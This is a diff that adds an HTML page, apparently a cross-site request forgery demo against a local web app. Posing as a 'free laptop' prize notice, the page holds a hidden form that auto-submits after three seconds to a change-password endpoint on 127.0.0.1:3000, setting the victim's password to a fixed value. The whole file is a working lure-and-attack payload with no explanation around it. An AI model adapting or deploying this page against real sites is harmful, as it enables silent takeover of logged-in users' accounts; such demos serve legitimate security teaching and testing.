@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Win a Free Laptop!</title></head>
+<body>
+  <h1>🎁 Congratulations! You won a free laptop!</h1>
+  <p>Please wait, claiming your prize...</p>
+  <form id="evil" action="http://127.0.0.1:3000/account/change-password" method="POST">
+    <input type="hidden" name="newPassword" value="eeman123">
+  </form>
+  <script>
+    // 3 second delay 
+    setTimeout(function () {
+      document.getElementById('evil').submit();
+    }, 3000);
+  </script>
+</body>
+</html>
